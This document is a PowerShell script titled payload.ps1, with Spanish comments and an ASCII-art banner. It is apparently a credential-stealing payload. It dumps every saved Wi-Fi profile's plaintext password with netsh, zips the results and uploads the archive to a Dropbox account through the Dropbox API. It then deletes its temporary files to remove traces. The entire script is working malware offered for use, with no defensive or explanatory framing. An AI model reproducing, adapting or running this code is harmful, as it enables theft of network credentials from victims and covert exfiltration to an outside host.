# payload.ps1
param (
    [string]$dropboxToken
)

function Show-Header {
    $header = @"
########################################################################################################################
#    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____                           #
#   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                         #
#  | |     \ \_/ /| |_) | |__  | |__) | |__  | |      | | | |__) | |__) | |__  | |__) | (___                           #
#  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                          #
#  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                         #
#   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/                          #
 #########################################################################################################################           
"@
    return $header
}

function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    )
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath = "/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $dropboxToken
    $headers = @{
        "Authorization" = $authorization
        "Dropbox-API-Arg" = $arg
        "Content-Type" = 'application/octet-stream'
    }

    # Añadir encabezado al contenido del archivo
    $header = Show-Header
    $fileContent = Get-Content -Path $SourceFilePath -Raw
    $combinedContent = $header + "`r`n" + $fileContent
    $tempFilePath = [System.IO.Path]::GetTempFileName()
    Set-Content -Path $tempFilePath -Value $combinedContent

    # Subir el archivo a Dropbox
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $tempFilePath -Headers $headers

    # Limpiar el archivo temporal
    Remove-Item -Path $tempFilePath -Force
}

function Get-WifiPasswords {
    $folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss')
    $userDir = "$env:USERPROFILE\Documents\Networks_$folderDateTime"
    New-Item -Path $userDir -ItemType Directory -Force | Out-Null

    $wifiProfiles = netsh wlan show profiles | Select-String ": " | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
    foreach ($profile in $wifiProfiles) {
        $profileFilePath = "$userDir\$profile.txt"
        netsh wlan show profile name=$profile key=clear | Out-File -FilePath $profileFilePath
    }

    $zipFilePath = "$userDir.zip"
    Compress-Archive -Path $userDir -DestinationPath $zipFilePath -Force

    Remove-Item -Path $userDir -Recurse -Force
    return $zipFilePath
}

try {
    # Obtener y comprimir las contraseñas WiFi
    $zipFilePath = Get-WifiPasswords

    # Subir a Dropbox si se proporciona el token
    if (-not ([string]::IsNullOrEmpty($dropboxToken))) {
        DropBox-Upload -f $zipFilePath
    } else {
        Write-Error "No se proporcionó el token de acceso de Dropbox."
    }

    # Limpiar el archivo ZIP
    Remove-Item -Path $zipFilePath -Force
}
catch {
    Write-Error "An error occurred: $_"
}